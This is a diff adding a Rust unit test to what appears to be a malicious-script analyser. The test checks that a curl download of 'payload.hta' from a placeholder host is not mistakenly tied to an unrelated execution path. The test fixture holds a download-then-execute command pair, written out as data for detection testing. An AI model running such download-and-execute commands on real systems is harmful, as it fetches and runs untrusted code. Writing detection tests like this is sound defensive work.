@@ -1593,6 +1593,25 @@ C:/Temp/payload.js"#;
     }
 
     #[test]
+    fn implicit_current_dir_nested_execution_does_not_use_unrelated_basename_download() {
+        let script = br#"curl -o D:\Other\payload.hta https://implicit-current-dir-wrong-basename.example/payload.hta
+.\Temp\payload.hta"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#".\Temp\payload.hta"#
+                            && url == "https://implicit-current-dir-wrong-basename.example/payload.hta"
+                )
+            }),
+            "implicit current-dir nested execution reused unrelated basename download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn schtasks_create_emits_persistence_trait() {
         // `schtasks /create /tn X /tr Y` registers a scheduled-task
         // autorun. Same Persistence trait as reg-add Run, with
